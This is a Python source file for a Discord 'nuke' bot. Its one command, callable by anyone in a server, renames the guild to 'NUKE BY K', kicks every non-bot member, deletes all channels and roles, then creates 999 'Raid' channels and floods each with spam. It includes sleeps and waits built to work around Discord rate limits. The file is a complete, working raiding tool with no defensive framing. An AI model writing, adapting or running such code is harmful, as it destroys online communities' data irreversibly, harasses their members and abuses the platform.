import discord
from discord.ext import commands
import os
from dotenv import load_dotenv
import asyncio

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user}')
    print(f'Bot is ready to Use')

@bot.command(name='nuke')
async def nuke(ctx):
    """
    Complete server nuke command
    - Kick all members
    - Delete all channels
    - Delete all roles
    - Change server name
    - Create 999+ new channels
    - Send spam message in all channels
    """
    
    guild = ctx.guild
    
    # Confirmation
    embed = discord.Embed(
        title="🔥 NUKE INCOMING! 🔥",
        description="Server nuke will start in 5 seconds...\n\n"
                    "This will:\n"
                    "✓ Kick all members\n"
                    "✓ Delete all channels\n"
                    "✓ Delete all roles\n"
                    "✓ Create 999+ new channels\n"
                    "✓ Change server name",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)
    
    await asyncio.sleep(5)
    
    try:
        # Step 1: Change server name
        print("📝 Changing server name...")
        await guild.edit(name="NUKE BY K")
        print("✅ Server name changed!")
        
        # Step 2: Kick all members (except bot)
        print("👢 Kicking all members...")
        for member in guild.members:
            try:
                if member.id != bot.user.id and not member.bot:
                    await member.kick(reason="Nuke command executed")
                    print(f"Kicked: {member.name}")
            except Exception as e:
                print(f"Could not kick {member.name}: {e}")
        print("✅ All members kicked!")
        
        # Step 3: Delete all channels
        print("🗑️ Deleting all channels...")
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Could not delete {channel.name}: {e}")
        print("✅ All channels deleted!")
        
        # Step 4: Delete all roles (except @everyone)
        print("🔴 Deleting all roles...")
        for role in guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    print(f"Deleted role: {role.name}")
            except Exception as e:
                print(f"Could not delete {role.name}: {e}")
        print("✅ All roles deleted!")
        
        # Step 5: Create 999+ new channels
        print("📺 Creating 999+ new channels...")
        spam_message = "🔥 NUKE BY K 🔥"
        
        for i in range(999):
            try:
                channel = await guild.create_text_channel(name=f"Raid-{i+1}")
                print(f"Created channel: {i+1}/999")
                
                # Send spam message 10 times
                for j in range(10):
                    try:
                        await channel.send(spam_message)
                        await asyncio.sleep(0.5)  # Small delay to avoid rate limit
                    except Exception as e:
                        print(f"Could not send message: {e}")
                
                # Slow down channel creation to avoid rate limits
                if (i + 1) % 10 == 0:
                    await asyncio.sleep(2)
                    
            except Exception as e:
                print(f"Could not create channel {i+1}: {e}")
                if "You are being rate limited" in str(e):
                    print("Rate limited! Waiting 60 seconds...")
                    await asyncio.sleep(60)
        
        print("✅ All 999+ channels created and spammed!")
        
        # Final message
        embed_final = discord.Embed(
            title="💥 NUKE COMPLETE! 💥",
            description="🔥 Server has been nuked by ROHIT 🔥\n\n"
                        "✅ All members kicked\n"
                        "✅ All channels deleted\n"
                        "✅ All roles deleted\n"
                        "✅ 999+ new channels created\n"
                        "✅ Spam message sent",
            color=discord.Color.red()
        )
        
        # Try to send final message in first channel
        try:
            channels = await guild.fetch_channels()
            if channels:
                await channels[0].send(embed=embed_final)
        except:
            pass
            
    except Exception as e:
        print(f"❌ Error during nuke: {e}")
        embed_error = discord.Embed(
            title="❌ NUKE FAILED!",
            description=f"Error: {str(e)}",
            color=discord.Color.red()
        )
        try:
            await ctx.send(embed=embed_error)
        except:
            pass

# Run bot
if __name__ == "__main__":
    token = os.getenv('DISCORD_TOKEN')
    if not token:
        print("❌ ERROR: DISCORD_TOKEN not found in .env file")
        print("Please create a .env file and add your bot token")
    else:
        import time
        try:
            bot.run(token)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                time.sleep(3600)
